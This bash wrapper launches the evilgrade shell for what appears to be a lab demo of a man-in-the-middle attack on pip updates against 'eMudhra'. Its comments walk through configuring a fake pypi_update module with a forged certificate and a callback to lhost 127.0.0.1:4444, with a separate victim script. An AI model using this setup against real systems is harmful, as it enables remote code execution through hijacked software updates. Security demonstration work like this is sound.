#!/bin/bash
###############################################################################
# console.sh - launch the INTERACTIVE evilgrade shell for the eMudhra demo,
#              with a sanitized env so the system perl loads cleanly.
#
# Why: evilgrade's webserver needs IO::Socket::SSL, which ships with the SYSTEM
# perl (/usr/bin/perl), NOT Homebrew's. But if your shell exports Homebrew
# perl's lib dirs (PERL5LIB etc.), the system perl tries to load Homebrew's XS
# .bundle files and dies with "loadable library and perl binaries are
# mismatched". This wrapper clears those vars and sets PERL5LIB to the project.
#
# Usage:
#   demo/emudhra_mitm/console.sh          # bind SSL :443 (needs sudo for <1024)
#   demo/emudhra_mitm/console.sh 9443     # bind SSL :9443 (no sudo)
#
# Then, inside the shell:
#   set sslport 9443          (match the port you passed, or leave 443)
#   set sslcert certs/emudhra_mitm
#   configure pypi_update
#   set lhost 127.0.0.1
#   set lport 4444
#   set enable 1
#   configure                 (bare -> back to top level)
#   start
#
# Leave this running; drive the victim from another console with victim_pip.sh.
###############################################################################
cd "$(dirname "$0")/../.." || exit 1
PORT="${1:-}"

echo "[console] starting evilgrade (system perl, sanitized env)"
[ -n "$PORT" ] && echo "[console] reminder: inside the shell run 'set sslport $PORT'"
echo "[console] if you bind :443 you must run this with sudo"
echo

exec env -u PERL5LIB -u PERL_LOCAL_LIB_ROOT -u PERL_MB_OPT -u PERL_MM_OPT \
     PERL5LIB=.:./isrcore \
     /usr/bin/perl ./evilgrade
